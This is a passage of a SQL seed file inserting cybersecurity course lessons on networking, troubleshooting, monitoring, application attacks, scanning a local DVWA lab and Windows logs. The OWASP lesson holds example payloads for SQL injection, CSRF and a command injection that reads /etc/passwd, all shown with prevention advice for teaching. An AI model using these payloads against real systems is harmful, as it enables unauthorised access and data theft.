+ 'IPv6 addressing, NAT/PAT operation, and transition mechanisms.',
+$md$
+# IPv6 and Network Address Translation
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe IPv6 address format, types, and configuration methods.
+- Explain why IPv6 was developed and how it differs from IPv4.
+- Describe NAT and PAT and how they conserve IPv4 addresses.
+- Identify IPv4-to-IPv6 transition mechanisms.
+
+## Why IPv6?
+
+IPv4 has approximately 4.3 billion addresses. With billions of devices connected, IPv4 addresses are exhausted. **NAT** (see below) extended IPv4's life by sharing one public IP among many private devices, but it introduces complexity. IPv6 provides 2^128 addresses — effectively unlimited.
+
+## IPv6 Address Format
+
+An IPv6 address is 128 bits, written as eight groups of four hexadecimal digits separated by colons:
+
+```
+2001:0db8:85a3:0000:0000:8a2e:0370:7334
+```
+
+**Shortening rules:**
+- Drop leading zeros in each group: `0db8` → `db8`, `0000` → `0`.
+- Replace one consecutive run of all-zero groups with `::` (only once): `2001:db8:85a3::8a2e:370:7334`.
+
+### IPv6 Address Types
+
+| Type | Prefix | Description |
+|------|--------|-------------|
+| **Global unicast** | `2000::/3` | Public routable addresses (like IPv4 public IPs) |
+| **Link-local** | `fe80::/10` | Auto-configured; only valid on the local link (like 169.254.x.x in IPv4) |
+| **Unique local** | `fc00::/7` | Private addresses (like 10.x.x.x / 192.168.x.x in IPv4) |
+| **Multicast** | `ff00::/8` | One-to-many (replaces broadcast — IPv6 has no broadcast) |
+| **Loopback** | `::1` | Localhost (like 127.0.0.1) |
+
+### IPv6 Configuration Methods
+
+- **SLAAC** (Stateless Address Autoconfiguration) — device generates its own address from the network prefix (advertised by the router) + its interface ID. No DHCP server needed.
+- **DHCPv6** (Stateful) — a DHCP server assigns addresses, similar to IPv4 DHCP.
+- **Static** — manually configured.
+
+## NAT (Network Address Translation)
+
+NAT allows devices with **private** IP addresses (10.x.x.x, 172.16-31.x.x, 192.168.x.x) to communicate with the internet using a single **public** IP address. The router translates between private and public addresses.
+
+### NAT Types
+
+| Type | Description |
+|------|-------------|
+| **Static NAT** | One private IP maps to one public IP (1:1). Used for servers. |
+| **Dynamic NAT** | Pool of public IPs shared among private IPs (many:many). |
+| **PAT (Port Address Translation)** | Many private IPs share one public IP by using different port numbers (many:1). Also called NAT overload. **Most common type.** |
+
+### How PAT Works
+
+When device 192.168.1.10 sends a request to a web server, the router:
+1. Replaces the source IP with the public IP (e.g. 203.0.113.5).
+2. Assigns a unique source port (e.g. 50001).
+3. Records the mapping: 192.168.1.10:45678 ↔ 203.0.113.5:50001.
+4. When the response returns to 203.0.113.5:50001, the router translates it back to 192.168.1.10:45678.
+
+## IPv4-to-IPv6 Transition
+
+| Mechanism | Description |
+|-----------|-------------|
+| **Dual stack** | Device runs both IPv4 and IPv6 simultaneously. Most common approach. |
+| **Tunneling** | IPv6 packets encapsulated inside IPv4 packets to cross IPv4-only networks (e.g. 6to4, Teredo, ISATAP). |
+| **NAT64** | Translates between IPv6 and IPv4 at the network boundary. |
+
+## Key Takeaways
+
+- IPv6 uses 128-bit addresses written in hex; know shortening rules and address types.
+- IPv6 has no broadcast — it uses multicast instead.
+- PAT (NAT overload) is the most common NAT type — shares one public IP using port numbers.
+- Dual stack is the primary IPv4-to-IPv6 transition strategy.
+$md$, 30, 2),
+
+('b0000000-0000-4000-8000-000000000024', 'Network Troubleshooting Tools and Methodology',
+ 'Command-line diagnostic tools and systematic troubleshooting for Network+.',
+$md$
+# Network Troubleshooting Tools and Methodology
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Apply a systematic network troubleshooting methodology.
+- Use common command-line network tools: ping, tracert/traceroute, ipconfig/ifconfig, nslookup, netstat, arp, pathping.
+- Diagnose common network problems using these tools.
+
+## Troubleshooting Methodology (CompTIA 7-Step)
+
+1. **Identify the problem** — gather information: what changed? Who is affected? When did it start? Can you reproduce it?
+2. **Establish a theory of probable cause** — based on symptoms, form a hypothesis. Start with the simplest explanation.
+3. **Test the theory** — verify your hypothesis. If wrong, form a new theory.
+4. **Establish a plan of action** — plan the fix and consider impact.
+5. **Implement the solution** — apply the fix (or escalate if beyond your scope).
+6. **Verify full system functionality** — confirm the fix works and nothing else broke.
+7. **Document** — record the problem, cause, and solution.
+
+## Command-Line Network Tools
+
+### ping
+
+Tests basic connectivity by sending ICMP echo requests.
+
+```
+ping 8.8.8.8           # Test by IP (bypasses DNS)
+ping google.com         # Test by name (tests DNS + connectivity)
+ping -t 192.168.1.1     # Continuous ping (Windows; Ctrl+C to stop)
+```
+
+If `ping 8.8.8.8` works but `ping google.com` fails → DNS problem.
+If both fail → network connectivity problem.
+
+### tracert / traceroute
+
+Shows every hop (router) between you and the destination.
+
+```
+tracert google.com      # Windows
+traceroute google.com   # Linux
+```
+
+Look for: high latency at a specific hop (bottleneck), timeouts (* * *) indicating a router that blocks ICMP or is unreachable.
+
+### ipconfig / ifconfig / ip
+
+Show and manage IP configuration.
+
+```
+ipconfig                # Windows — show IP, subnet, gateway
+ipconfig /all           # Windows — show full details (MAC, DHCP, DNS)
+ipconfig /release       # Release DHCP lease
+ipconfig /renew         # Request new DHCP lease
+ipconfig /flushdns      # Clear DNS cache
+ip addr                 # Linux — show IP addresses
+ip route                # Linux — show routing table
+```
+
+### nslookup / dig
+
+Query DNS servers.
+
+```
+nslookup example.com    # Quick DNS lookup (Windows/Linux)
+dig example.com         # Detailed DNS lookup (Linux)
+```
+
+### netstat / ss
+
+Show active network connections and listening ports.
+
+```
+netstat -an             # Windows/Linux — all connections, numeric
+netstat -b              # Windows — show which process owns each connection
+ss -tuln                # Linux — TCP/UDP listening sockets, numeric
+```
+
+### arp
+
+Show and manage the ARP cache (IP-to-MAC mappings).
+
+```
+arp -a                  # Show ARP cache
+```
+
+Useful for detecting **ARP poisoning** — if two IPs map to the same MAC, someone may be performing a man-in-the-middle attack.
+
+### pathping (Windows only)
+
+Combines ping and tracert. Sends packets over a period and reports packet loss at each hop.
+
+```
+pathping google.com
+```
+
+## Common Network Problems and Diagnosis
+
+| Symptom | Likely Cause | Tool to Diagnose |
+|---------|-------------|-----------------|
+| No connectivity at all | Cable unplugged, NIC disabled, DHCP failure | Check link light; `ipconfig` for 169.254.x.x (APIPA = no DHCP) |
+| Can ping IP but not hostname | DNS failure | `nslookup`; check DNS server setting |
+| Slow network | Congestion, duplex mismatch, bandwidth saturation | `pathping` for packet loss; `netstat` for connection count |
+| Intermittent connectivity | Loose cable, wireless interference, IP conflict | Check cable connections; `ping -t` for pattern; Event Viewer for IP conflict |
+| Can reach local but not internet | Default gateway wrong or unreachable | `ipconfig` to check gateway; `ping` gateway; `tracert` |
+
+## Key Takeaways
+
+- Always follow the 7-step methodology — start with the simplest explanation.
+- ping tests connectivity; tracert finds where it breaks; ipconfig shows your configuration.
+- If ping by IP works but by name fails = DNS issue.
+- APIPA address (169.254.x.x) = DHCP server unreachable.
+$md$, 30, 3),
+
+('b0000000-0000-4000-8000-000000000024', 'Network Operations: SNMP, Syslog, and Documentation',
+ 'Network monitoring protocols, logging infrastructure, and documentation standards.',
+$md$
+# Network Operations: SNMP, Syslog, and Documentation
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Describe SNMP and its role in network monitoring.
+- Explain syslog and centralised logging.
+- Describe NTP and why time synchronisation matters.
+- Identify key network documentation types and best practices.
+
+## SNMP (Simple Network Management Protocol)
+
+SNMP allows network management systems to monitor and manage devices (routers, switches, firewalls, servers, printers).
+
+### Components
+
+- **SNMP Manager** (monitoring server, e.g. Nagios, PRTG, Zabbix) — polls devices and receives alerts.
+- **SNMP Agent** — software on each managed device that responds to queries and sends traps.
+- **MIB (Management Information Base)** — database of objects (OIDs) the agent can report (CPU usage, interface status, error counts, uptime).
+
+### SNMP Versions
+
+| Version | Authentication | Encryption | Notes |
+|---------|---------------|------------|-------|
+| **v1** | Community string (plaintext) | None | Insecure; legacy |
+| **v2c** | Community string (plaintext) | None | Improved performance; still insecure |
+| **v3** | Username + password (USM) | Yes (DES/AES) | **Recommended** — only version with encryption |
+
+**Exam tip:** Always use SNMPv3 in production. Community strings in v1/v2c are sent in cleartext.
+
+## Syslog
+
+Syslog is a standard for sending log messages from devices to a centralised **syslog server**. Uses UDP port 514 (or TCP 514 / TLS 6514 for reliable/secure transport).
+
+### Syslog Severity Levels
+
+| Level | Keyword | Description |
+|-------|---------|-------------|
+| 0 | Emergency | System is unusable |
+| 1 | Alert | Immediate action needed |
+| 2 | Critical | Critical conditions |
+| 3 | Error | Error conditions |
+| 4 | Warning | Warning conditions |
+| 5 | Notice | Normal but significant |
+| 6 | Informational | Informational messages |
+| 7 | Debug | Debug-level messages |
+
+Centralised logging is essential for: correlation (see events across devices), compliance (audit trail), incident investigation, and long-term storage.
+
+## NTP (Network Time Protocol)
+
+NTP synchronises clocks across network devices. Uses UDP port 123.
+
+Why it matters:
+- **Log correlation** — if devices have different times, correlating events across logs is impossible.
+- **Authentication** — Kerberos requires clocks to be within 5 minutes; certificate validity depends on correct time.
+- **Compliance** — regulations require accurate timestamps.
+
+NTP uses a hierarchy of **stratum** levels: Stratum 0 (atomic clock), Stratum 1 (directly connected to Stratum 0), Stratum 2, etc.
+
+## Network Documentation
+
+| Document | Purpose | Content |
+|----------|---------|---------|
+| **Network diagram** | Visual map of topology | Devices, connections, IP ranges, VLANs, WAN links |
+| **Wiring diagram** | Physical cable infrastructure | Patch panel connections, cable runs, labels |
+| **IP address plan (IPAM)** | Track IP allocation | Subnets, DHCP ranges, static assignments, reservations |
+| **Baseline** | Normal performance metrics | Average bandwidth, latency, CPU/memory usage during normal operations |
+| **Change log** | Record of all changes | What changed, when, by whom, rollback plan |
+| **Configuration backup** | Copy of device configs | Router/switch/firewall running and startup configs |
+
+### Performance Baselines
+
+A baseline records what "normal" looks like. Without a baseline, you cannot determine if current performance is abnormal. Capture metrics over 7–30 days: bandwidth utilisation, latency, packet loss, CPU/memory on critical devices.
+
+## Key Takeaways
+
+- SNMPv3 is the only secure version — v1/v2c send community strings in cleartext.
+- Syslog centralises logs; severity 0 (Emergency) is most critical, 7 (Debug) is least.
+- NTP keeps clocks synchronised — critical for log correlation, authentication, and compliance.
+- Always maintain network diagrams, IP plans, baselines, and configuration backups.
+$md$, 25, 4),
+
+('b0000000-0000-4000-8000-000000000024', 'Network Analysis Tools: ss and Wireshark',
+ 'Hands-on introduction to socket statistics and Wireshark packet capture for the capstone.',
+$md$
+# Network Analysis Tools: ss and Wireshark
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Use ss to list listening and active network connections on Linux.
+- Capture live network traffic in Wireshark.
+- Apply display filters to isolate specific traffic.
+- Use Wireshark's Statistics views (Protocol Hierarchy, Conversations, Endpoints).
+- Analyse a PCAP file to extract useful information.
+
+## ss — Socket Statistics
+
+`ss` is the modern replacement for `netstat` on Linux. It shows active connections and listening sockets.
+
+### Common Usage
+
+```
+ss -tuln          # TCP and UDP, listening, numeric (no DNS resolution)
+ss -tulnp         # Same but show the process name (requires sudo)
+ss -s             # Summary statistics
+ss -t state established  # Show only established TCP connections
+```
+
+### Reading ss Output
+
+```
+State    Recv-Q  Send-Q  Local Address:Port  Peer Address:Port  Process
+LISTEN   0       128     0.0.0.0:22          0.0.0.0:*          sshd
+LISTEN   0       128     0.0.0.0:80          0.0.0.0:*          apache2
+ESTAB    0       0       10.0.0.5:22         10.0.0.1:54321     sshd
+```
+
+- `0.0.0.0:22` means SSH is listening on all interfaces on port 22.
+- `ESTAB` means there is an active connection from 10.0.0.1 to the SSH service.
+
+**Security use:** Identify unexpected listening services (indicators of compromise) or connections to suspicious IPs.
+
+## Wireshark — Packet Capture and Analysis
+
+Wireshark is a graphical network protocol analyser. It captures packets from a network interface and lets you inspect them in detail. Pre-installed on Kali Linux.
+
+### Starting a Capture
+
+1. Open Wireshark.
+2. Select a network interface (e.g. `eth0` for wired, `wlan0` for wireless).
+3. Click the blue shark fin button to start capturing.
+4. Generate some traffic (e.g. browse a website).
+5. Click the red square to stop.
+
+### Display Filters
+
+Display filters let you show only the traffic you care about:
+
+| Filter | Shows |
+|--------|-------|
+| `dns` | DNS queries and responses |
+| `http` | HTTP traffic |
+| `tcp.port == 443` | HTTPS traffic |
+| `ip.addr == 10.0.0.1` | Traffic to/from a specific IP |
+| `tcp.flags.syn == 1` | TCP SYN packets (connection attempts) |
+| `http.request` | HTTP requests only |
+| `!(arp or dns)` | Everything except ARP and DNS (reduce noise) |
+
+Type the filter in the filter bar and press Enter. Green = valid filter. Red = syntax error.
+
+### Protocol Hierarchy
+
+**Statistics → Protocol Hierarchy** shows a breakdown of all protocols in the capture by percentage. This gives a quick overview: mostly HTTP? Lots of DNS? Unexpected protocols?
+
+### Conversations and Endpoints
+
+- **Statistics → Conversations** — shows all communication pairs (who is talking to whom). Sort by bytes to find the largest data transfers.
+- **Statistics → Endpoints** — shows all unique hosts. Sort by packets or bytes.
+
+### Follow TCP Stream
+
+Right-click a packet → **Follow → TCP Stream**. This reconstructs the entire conversation between two hosts, showing the data exchanged in readable format. Extremely useful for analysing HTTP requests, seeing what data was transferred, and identifying suspicious content.
+
+### Analysing a PCAP File
+
+A PCAP (Packet Capture) file is a saved capture. Open it with: **File → Open** or `wireshark sample.pcap` from the command line.
+
+Analysis workflow:
+1. **Statistics → Protocol Hierarchy** — what protocols are present?
+2. **Statistics → Conversations** — who is the most active?
+3. **Apply filters** — zoom in on interesting traffic (e.g. `http.request`).
+4. **Follow TCP streams** — read the actual data exchanged.
+5. **Note anomalies** — unusual ports, unexpected protocols, large transfers, connections to suspicious IPs.
+
+## Key Takeaways
+
+- `ss -tuln` is the fastest way to see what is listening on a Linux system.
+- Wireshark captures and decodes network traffic at the packet level.
+- Display filters are essential — learn the common ones (dns, http, tcp.port, ip.addr).
+- Protocol Hierarchy and Conversations views give quick situational awareness.
+- Follow TCP Stream reconstructs full conversations for analysis.
+$md$, 35, 5);
+
+-- ========== BH-CYBER-2: Module 5 — Application Security and Automation ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000035', 'Application Attacks and the OWASP Top 10',
+ 'SQL injection, XSS, CSRF, command injection, and the OWASP Top 10 for Security+.',
+$md$
+# Application Attacks and the OWASP Top 10
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Explain how common web application attacks work: SQL injection, XSS, CSRF, and command injection.
+- Describe the OWASP Top 10 and its purpose.
+- Identify prevention techniques for each attack type.
+
+## Why Application Security Matters
+
+Web applications handle sensitive data (credentials, payment info, personal data). Unlike network attacks, application attacks target the **logic** of the application itself. If the code is vulnerable, firewalls and encryption cannot help — the attacker uses the application's own features against it.
+
+## SQL Injection (SQLi)
+
+SQL injection occurs when user input is inserted directly into a SQL query without sanitisation.
+
+**How it works:** A login form sends username and password to the server, which builds a query:
+
+```sql
+SELECT * FROM users WHERE username = '[input]' AND password = '[input]'
+```
+
+If an attacker enters `' OR '1'='1` as the username:
+
+```sql
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
+```
+
+Since `'1'='1'` is always true, the query returns all users — the attacker bypasses authentication.
+
+**Impact:** Data theft, authentication bypass, data modification, database destruction (`DROP TABLE`).
+
+**Prevention:**
+- **Parameterised queries** (prepared statements) — the database treats input as data, not code.
+- **Input validation** — reject unexpected characters.
+- **Least privilege** — database accounts used by the app should have minimal permissions.
+
+## Cross-Site Scripting (XSS)
+
+XSS occurs when an attacker injects malicious JavaScript into a web page viewed by other users.
+
+**Types:**
+
+| Type | Description | Example |
+|------|-------------|---------|
+| **Reflected** | Script is in a URL parameter; reflected back in the page | Phishing link with script in the URL |
+| **Stored** | Script is saved in the database (e.g. comment field); executed for every visitor | Forum post containing `<script>` tag |
+| **DOM-based** | Script manipulates the page's DOM on the client side | JavaScript reads URL fragment and writes it to the page |
+
+**Impact:** Cookie theft (session hijacking), keylogging, defacement, redirects to malicious sites.
+
+**Prevention:**
+- **Output encoding** — convert special characters (`<`, `>`, `"`, `'`) to HTML entities.
+- **Content Security Policy (CSP)** — HTTP header that restricts which scripts can execute.
+- **Input validation** — reject HTML/script tags in user input.
+
+## Cross-Site Request Forgery (CSRF)
+
+CSRF tricks a logged-in user's browser into making an unwanted request to a web application.
+
+**How it works:** A user is logged in to their bank. They visit a malicious website that contains a hidden form:
+
+```html
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+```
+
+The browser sends the request with the user's authentication cookie — the bank processes the transfer.
+
+**Prevention:**
+- **Anti-CSRF tokens** — unique token in each form that the server validates.
+- **SameSite cookie attribute** — prevents cookies from being sent with cross-site requests.
+
+## Command Injection
+
+Command injection occurs when user input is passed to a system command.
+
+**Example:** A web app has a "ping" feature:
+
+```python
+os.system("ping -c 4 " + user_input)
+```
+
+If the attacker enters `; cat /etc/passwd`, the server executes:
+
+```
+ping -c 4 ; cat /etc/passwd
+```
+
+The semicolon separates commands — the server pings, then outputs the password file.
+
+**Prevention:** Never pass user input to system commands. If unavoidable, use whitelists and parameterised APIs.
+
+## The OWASP Top 10 (2021)
+
+The Open Web Application Security Project publishes the ten most critical web application security risks:
+
+| # | Risk | Description |
+|---|------|-------------|
+| A01 | **Broken Access Control** | Users can act outside their permissions |
+| A02 | **Cryptographic Failures** | Sensitive data exposed due to weak/missing encryption |
+| A03 | **Injection** | SQLi, command injection, LDAP injection |
+| A04 | **Insecure Design** | Missing security controls in the design phase |
+| A05 | **Security Misconfiguration** | Default credentials, unnecessary features, missing patches |
+| A06 | **Vulnerable and Outdated Components** | Using libraries with known vulnerabilities |
+| A07 | **Identification and Authentication Failures** | Weak passwords, no MFA, session issues |
+| A08 | **Software and Data Integrity Failures** | Insecure CI/CD, unsigned updates |
+| A09 | **Security Logging and Monitoring Failures** | No logging, no alerting on suspicious activity |
+| A10 | **Server-Side Request Forgery (SSRF)** | App fetches a URL provided by the attacker |
+
+## Key Takeaways
+
+- SQLi exploits unsanitised input in database queries — prevent with parameterised queries.
+- XSS injects malicious JavaScript — prevent with output encoding and CSP.
+- CSRF tricks browsers into making unauthorised requests — prevent with anti-CSRF tokens.
+- Command injection passes input to system commands — never pass user input to OS commands.
+- The OWASP Top 10 is the industry standard for web application risk awareness.
+$md$, 35, 1),
+
+('b0000000-0000-4000-8000-000000000035', 'Automation and Scripting for Security',
+ 'Using Python, PowerShell, and Bash for security automation — a key Security+ SY0-701 domain.',
+$md$
+# Automation and Scripting for Security
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Explain why automation is critical in modern security operations.
+- Identify common security automation use cases.
+- Read and understand basic security scripts in Python, PowerShell, and Bash.
+- Describe SOAR and its role in incident response automation.
+
+## Why Automate?
+
+Security teams face thousands of alerts daily, manage hundreds of systems, and must respond to incidents in minutes. Manual processes cannot scale. Automation:
+
+- **Reduces response time** — automated playbooks can contain threats in seconds.
+- **Ensures consistency** — scripts execute the same steps every time.
+- **Frees analysts** — routine tasks are handled automatically; analysts focus on complex decisions.
+- **Improves coverage** — automated scans and checks run 24/7.
+
+## Common Automation Use Cases
+
+| Use Case | What It Does | Benefit |
+|----------|-------------|---------|
+| **Automated vulnerability scanning** | Schedule regular scans of all assets | Continuous visibility into vulnerabilities |
+| **Log parsing and alerting** | Scripts parse logs for IOCs and trigger alerts | Faster detection |
+| **Account management** | Auto-disable accounts inactive for 90 days | Reduces attack surface |
+| **Patch deployment** | Automate patch testing and rollout | Consistent, timely patching |
+| **Phishing response** | Auto-quarantine emails matching IOCs, reset affected passwords | Faster containment |
+| **Firewall rule updates** | Block malicious IPs from threat feeds automatically | Real-time protection |
+
+## Scripting for Security
+
+### Bash Example — Check for Listening Services
+
+```bash
+#!/bin/bash
+# Alert on unexpected listening ports
+EXPECTED="22 80 443"
+for port in $(ss -tuln | awk 'NR>1 {print $5}' | grep -oP '\d+$' | sort -u); do
+    if ! echo "$EXPECTED" | grep -qw "$port"; then
+        echo "ALERT: Unexpected port $port is listening"
+    fi
+done
+```
+
+### PowerShell Example — Find Disabled Accounts Still in Groups
+
+```powershell
+# Find disabled AD accounts that still belong to security groups
+Get-ADUser -Filter {Enabled -eq $false} -Properties MemberOf |
+    Where-Object { $_.MemberOf.Count -gt 0 } |
+    Select-Object Name, @{N="Groups";E={$_.MemberOf -join ", "}}
+```
+
+### Python Example — Check SSL Certificate Expiry
+
+```python
+import ssl, socket, datetime
+
+def check_cert(hostname, port=443):
+    ctx = ssl.create_default_context()
+    with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
+        s.connect((hostname, port))
+        cert = s.getpeercert()
+        expires = datetime.datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
+        days_left = (expires - datetime.datetime.utcnow()).days
+        print(f"{hostname}: certificate expires in {days_left} days")
+        if days_left < 30:
+            print("  WARNING: Expiring soon!")
+
+check_cert("example.com")
+```
+
+**Exam tip (Security+):** You do not need to write scripts from scratch. You need to **read** a script and understand what it does, identify the language from syntax, and recognise common security use cases.
+
+## SOAR (Security Orchestration, Automation, and Response)
+
+SOAR platforms (e.g. Splunk SOAR, Palo Alto XSOAR, IBM QRadar SOAR) combine:
+
+- **Orchestration** — connect security tools (SIEM, firewall, EDR, ticketing) via APIs.
+- **Automation** — playbooks automate multi-step response (e.g. "when phishing email detected: extract URLs → check threat intel → block domain → quarantine email → create ticket → notify user").
+- **Response** — standardised incident response workflows.
+
+## Key Takeaways
+
+- Security automation reduces response time and ensures consistency.
+- Know what Bash, PowerShell, and Python scripts look like and common security use cases.
+- SOAR platforms orchestrate tools and automate incident response playbooks.
+- Security+ SY0-701 tests scripting recognition, not writing.
+$md$, 30, 2),
+
+('b0000000-0000-4000-8000-000000000035', 'Email Security and Data Classification',
+ 'SPF, DKIM, DMARC, data classification levels, and data loss prevention (DLP).',
+$md$
+# Email Security and Data Classification
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Explain email authentication protocols: SPF, DKIM, and DMARC.
+- Describe data classification levels and their purpose.
+- Explain data loss prevention (DLP) and how it protects sensitive data.
+- Describe data roles: owner, custodian, processor, controller.
+
+## Email Security
+
+Email is the number one attack vector. Phishing, business email compromise (BEC), and malware delivery all use email. Three DNS-based protocols authenticate email senders:
+
+### SPF (Sender Policy Framework)
+
+A DNS TXT record that lists which mail servers are authorised to send email for a domain.
+
+```
+v=spf1 include:_spf.google.com ip4:203.0.113.5 -all
+```
+
+- `include:_spf.google.com` — Google's servers are authorised.
+- `ip4:203.0.113.5` — this IP is authorised.
+- `-all` — reject all others (hard fail). `~all` = soft fail (accept but mark).
+
+### DKIM (DomainKeys Identified Mail)
+
+The sending server signs outgoing emails with a private key. The receiving server verifies the signature using the sender's public key (published as a DNS TXT record). This proves the email was not modified in transit and really came from that domain.
+
+### DMARC (Domain-based Message Authentication, Reporting, and Conformance)
+
+DMARC tells receiving servers what to do when SPF or DKIM fails:
+
+```
+v=DMARC1; p=reject; rua=mailto:dmarc-reports@example.com
+```
+
+- `p=none` — monitor only (no action).
+- `p=quarantine` — send to spam folder.
+- `p=reject` — reject the email entirely.
+- `rua=` — send aggregate reports to this address.
+
+**Together:** SPF validates the sending server, DKIM validates the message integrity, and DMARC provides policy and reporting.
+
+## Data Classification
+
+Data classification categorises information by sensitivity to determine appropriate handling and protection.
+
+### Common Classification Levels
+
+| Level | Description | Examples | Handling |
+|-------|-------------|----------|----------|
+| **Public** | No harm if disclosed | Marketing materials, press releases | No restrictions |
+| **Internal** | Minor impact if disclosed | Internal policies, org charts | Share within the organisation only |
+| **Confidential** | Significant impact if disclosed | Customer data, financial reports, contracts | Encryption, access controls, need-to-know |
+| **Restricted / Secret** | Severe impact if disclosed | Trade secrets, PII/PHI, cryptographic keys | Strong encryption, strict access controls, audit logging |
+
+Government classification: Unclassified → Confidential → Secret → Top Secret.
+
+### Data Roles
+
+| Role | Responsibility |
+|------|---------------|
+| **Data owner** | Senior leader who decides classification, access policies, and acceptable use |
+| **Data custodian** | IT staff who implement and maintain security controls (backups, encryption, access) |
+| **Data controller** | (GDPR term) Determines the purposes and means of processing personal data |
+| **Data processor** | (GDPR term) Processes data on behalf of the controller |
+| **Data steward** | Ensures data quality, accuracy, and compliance with policies |
+
+## Data Loss Prevention (DLP)
+
+DLP systems monitor, detect, and prevent unauthorised transmission of sensitive data.
+
+### DLP Deployment Points
+
+| Location | What It Monitors |
+|----------|-----------------|
+| **Network DLP** | Email, web traffic, file transfers leaving the network |
+| **Endpoint DLP** | USB drives, printing, copy/paste, screen capture on user devices |
+| **Cloud DLP** | SaaS applications, cloud storage uploads |
+
+### How DLP Works
+
+1. **Define policies** — e.g. "Block any email containing more than 10 credit card numbers."
+2. **Content inspection** — DLP scans content using pattern matching (regex for card numbers, SSNs), keyword matching, and document fingerprinting.
+3. **Action** — block, quarantine, encrypt, alert, or log.
+
+## Key Takeaways
+
+- SPF + DKIM + DMARC together authenticate email and prevent spoofing.
+- Data classification drives handling requirements — know the four levels.
+- Data owners decide policy; custodians implement controls.
+- DLP monitors data in motion (network), at rest (endpoint), and in the cloud.
+$md$, 30, 3),
+
+('b0000000-0000-4000-8000-000000000035', 'Vulnerability Scanning Tools: nmap, nikto, and Docker',
+ 'Hands-on introduction to vulnerability scanning tools used in the capstone project.',
+$md$
+# Vulnerability Scanning Tools: nmap, nikto, and Docker
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Deploy DVWA (Damn Vulnerable Web Application) using Docker on Kali Linux.
+- Use nmap NSE scripts for vulnerability detection.
+- Use nikto to scan web servers for misconfigurations and vulnerabilities.
+- Interpret scan results and understand false positives.
+
+## Docker Basics
+
+Docker runs applications in isolated containers. A container is like a lightweight virtual machine that shares the host's kernel.
+
+### Key Commands
+
+```
+sudo docker pull [image]        # Download an image
+sudo docker run -d -p 80:80 [image]  # Run container in background, map port 80
+sudo docker ps                  # List running containers
+sudo docker stop [container_id] # Stop a container
+```
+
+### Setting Up DVWA
+
+DVWA is a deliberately vulnerable web application designed for security testing practice.
+
+```
+sudo docker run -d -p 80:80 vulnerables/web-dvwa
+```
+
+This downloads and starts DVWA on http://localhost. Default login: `admin` / `password`. After logging in, click "Create / Reset Database" to initialise.
+
+**Important:** DVWA runs only on your local machine. You are attacking your own system — this is legal and ethical.
+
+## nmap NSE Vulnerability Scripts
+
+nmap's Nmap Scripting Engine (NSE) includes scripts for vulnerability detection.
+
+### Vulnerability Scan
+
+```
+nmap --script vuln localhost
+```
+
+This runs all scripts in the "vuln" category against the target. Output might include:
+
+- CVE identifiers for known vulnerabilities.
+- SSL/TLS weaknesses.
+- HTTP vulnerabilities (directory listing, clickjacking).
+
+### Specific Script Categories
+
+```
+nmap --script "http-*" localhost      # All HTTP scripts
+nmap --script ssl-enum-ciphers localhost  # Check TLS cipher suites
+```
+
+### Reading NSE Output
+
+Each finding includes the script name and details:
+
+```
+| http-csrf:
+|   Spidering limited to: maxdepth=3; maxpagecount=20
+|   Found the following possible CSRF vulnerabilities:
+|     Path: http://localhost/vulnerabilities/csrf/
+|       Form id: 
+|       Form action: #
+```
+
+Not every finding is a confirmed vulnerability — NSE scripts may produce **false positives**. Always verify findings manually.
+
+## nikto — Web Server Scanner
+
+nikto scans web servers for thousands of known issues: outdated software, dangerous files, misconfigurations, and missing security headers.
+
+### Basic Scan
+
+```
+nikto -h http://localhost
+```
+
+### Output to File
+
+```
+nikto -h http://localhost -o scan_results.txt
+```
+
+### Reading nikto Output
+
+```
++ Server: Apache/2.4.25 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ /config/: Directory indexing found.
++ OSVDB-3268: /docs/: Directory indexing found.
++ /login.php: Admin login page/section found.
+```
+
+Each line starting with `+` is a finding. Some are informational, some are security issues. Key things to look for:
+
+- **Missing security headers** (X-Frame-Options, X-Content-Type-Options, CSP).
+- **Directory indexing** — server lists directory contents (information disclosure).
+- **Default/admin pages** exposed.
+- **Outdated server versions** with known CVEs.
+
+## Understanding False Positives
+
+Automated scanners report anything that **might** be an issue. Not everything is exploitable. A false positive is a finding that looks like a vulnerability but is not actually a risk in context. Always:
+
+1. **Verify** — can you actually exploit the finding?
+2. **Assess context** — is the "vulnerable" component exposed to attackers?
+3. **Check versions** — is the reported CVE actually applicable to this specific version?
+4. **Document** — record false positives so they are not re-investigated.
+
+## Key Takeaways
+
+- Docker lets you deploy vulnerable targets (DVWA) safely on your own machine.
+- `nmap --script vuln` runs NSE vulnerability scripts — useful but may produce false positives.
+- nikto scans web servers for misconfigurations, outdated software, and missing headers.
+- Always verify automated findings — not every scanner result is a real vulnerability.
+$md$, 30, 4);
+
+-- ========== BH-OPS-2: Module 3 — Security Monitoring and Analysis ==========
+INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
+('b0000000-0000-4000-8000-000000000043', 'Log Analysis Techniques',
+ 'Windows Event Logs, Sysmon, firewall logs, and proxy logs for SOC analysts.',
+$md$
+# Log Analysis Techniques
+
+## Objectives
+
+By the end of this lesson you will be able to:
+
+- Identify the key Windows Event Log sources and critical Event IDs.
+- Describe Sysmon and its value for detection.
+- Analyse firewall and proxy log entries.
+- Correlate events across multiple log sources.
+
+## Windows Event Logs
+
+Windows generates events in several log channels. The three most important for security:
+
+### Security Log — Key Event IDs
+
+| Event ID | Description | Why It Matters |
+|----------|-------------|---------------|
+| **4624** | Successful logon | Track who logged in, when, and from where |
+| **4625** | Failed logon | Detect brute-force attacks (many 4625s followed by 4624) |
+| **4648** | Logon with explicit credentials | Pass-the-hash, runas, lateral movement |
+| **4672** | Special privileges assigned | Admin logon — monitor for unexpected admin activity |
+| **4688** | New process created | See what programmes are being run (requires audit policy) |
+| **4720** | User account created | Detect unauthorised account creation |
+| **4732** | Member added to security group | Privilege escalation (e.g. added to Domain Admins) |
